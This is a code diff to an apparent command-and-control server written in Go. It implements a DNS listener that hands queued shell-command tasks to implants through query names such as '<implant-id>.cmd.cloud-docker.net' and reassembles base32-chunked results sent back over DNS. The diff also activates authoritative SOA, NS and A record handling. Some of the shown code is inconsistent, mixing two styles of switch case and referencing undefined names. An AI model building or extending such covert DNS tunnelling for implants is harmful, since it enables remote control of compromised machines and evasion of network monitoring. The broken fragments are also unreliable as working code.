@@ -7,51 +7,14 @@ import (
 	"github.com/miekg/dns"
 	"gorm.io/gorm"
 	"log"
+	"net"
 	"os"
 	"strconv"
 	"strings"
 	"sync"
 )
 
-// TODO: flag.Parse() fix -> listen
-// add
-
-//case dns.TypeSOA:
-//	if q.Name == fqdnDomain {
-//		m.Answer = append(m.Answer, &dns.SOA{
-//			Hdr:     dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 60},
-//			Ns:      ns1Name,
-//			Mbox:    "hostmaster." + fqdnDomain,
-//			Serial:  serial,
-//			Refresh: 3600, Retry: 1800, Expire: 604800, Minttl: 60,
-//		})
-//	}
-//
-//// NS
-//case dns.TypeNS:
-//	if q.Name == fqdnDomain {
-//		m.Answer = append(m.Answer,
-//			&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns1Name},
-//			&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns2Name},
-//		)
-//	}
-//
-//// A for your nameservers
-//case dns.TypeA:
-//	switch q.Name {
-//	case ns1Name:
-//		m.Answer = append(m.Answer, &dns.A{
-//			Hdr: dns.RR_Header{Name: ns1Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
-//			A:   net.ParseIP("<YOUR_STATIC_IP>"),
-//		})
-//	case ns2Name:
-//		m.Answer = append(m.Answer, &dns.A{
-//			Hdr: dns.RR_Header{Name: ns2Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
-//			A:   net.ParseIP("<YOUR_STATIC_IP>"),
-//		})
-//	}
-//default:
-//reply.Answer = []dns.RR{emptyTXT(q.Name)} // TODO: would this wokr?
+// TODO: make these functions simpler ?
 
 /*
 	- command format: `<implant-id>.cmd.cloud-docker.net`
@@ -59,7 +22,12 @@ import (
 */
 
 type DNSListener struct {
-	db *gorm.DB
+	db   *gorm.DB
+	fqdn string // TODO: can replace in other places where its calling dns.Fqdn again?
+}
+
+func NewDNS(db *gorm.DB, domain string) *DNSListener {
+	return &DNSListener{db: db, fqdn: dns.Fqdn(domain)}
 }
 
 // TODO: look at partialResult logic, does it make sense?
@@ -69,7 +37,7 @@ type partialResult struct {
 	chunks         []string // chunkIndex -> data
 }
 
-// DNSHandler handles both “.cmd.” and “.res.” requests in one place
+// DNSHandler handles both ".c." (for commands) and ".r." (for results) in one place
 type DNSHandler struct {
 	db          *gorm.DB
 	b32Encoding *base32.Encoding // Base32 no-padding encoder/decoder scheme
@@ -83,38 +51,6 @@ func NewDNSHandler(db *gorm.DB) *DNSHandler {
 		b32Encoding: base32.StdEncoding.WithPadding(base32.NoPadding),
 		pending:     make(map[uint]map[uint]*partialResult),
 	}
-}
-
-// getPendingTasks gets all incomplete tasks for the given implant
-func getPendingTasksForImplant(db *gorm.DB, implantID uint) ([]model.Task, error) {
-	var tasks []model.Task
-	err := db.
-		Where("implant_id = ? AND completed = ?", implantID, false).
-		Find(&tasks).
-		Error
-	return tasks, err
-
-}
-
-func storeNewResult(db *gorm.DB, implantID uint, res model.Result) error {
-	// TODO: make it so don't repeat this -> could move creating Result to storeNewResult, that would make way more sense
-	return db.Transaction(func(tx *gorm.DB) error {
-		var task model.Task
-		if err := tx.
-			Where("id = ? AND implant_id = ?", res.TaskID, implantID).
-			First(&task).Error; err != nil {
-			return err
-		}
-
-		if err := tx.Create(&res).Error; err != nil {
-			return err
-		}
-
-		return tx.
-			Model(&task).
-			Update("completed", true).
-			Error
-	})
 }
 
 func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
@@ -156,7 +92,7 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 		}
 
 		for _, task := range tasks {
-			if task.Type != model.ShellCommand {
+			if task.TaskType != model.ShellCommand {
 				continue
 			}
 
@@ -230,6 +166,40 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 			}
 		} else {
 			h.mu.Unlock()
+		}
+	case q.Qtype == dns.TypeSOA:
+		if q.Name == fqdnDomain {
+			m.Answer = append(m.Answer, &dns.SOA{
+				Hdr:     dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 60},
+				Ns:      ns1Name,
+				Mbox:    "hostmaster." + fqdnDomain,
+				Serial:  serial,
+				Refresh: 3600, Retry: 1800, Expire: 604800, Minttl: 60,
+			})
+		}
+
+	// NS
+	case dns.TypeNS:
+		if q.Name == fqdnDomain {
+			m.Answer = append(m.Answer,
+				&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns1Name},
+				&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns2Name},
+			)
+		}
+
+	// A for your nameservers
+	case dns.TypeA:
+		switch q.Name {
+		case ns1Name:
+			m.Answer = append(m.Answer, &dns.A{
+				Hdr: dns.RR_Header{Name: ns1Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
+				A:   net.ParseIP("<YOUR_STATIC_IP>"),
+			})
+		case ns2Name:
+			m.Answer = append(m.Answer, &dns.A{
+				Hdr: dns.RR_Header{Name: ns2Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
+				A:   net.ParseIP("<YOUR_STATIC_IP>"),
+			})
 		}
 	}
 
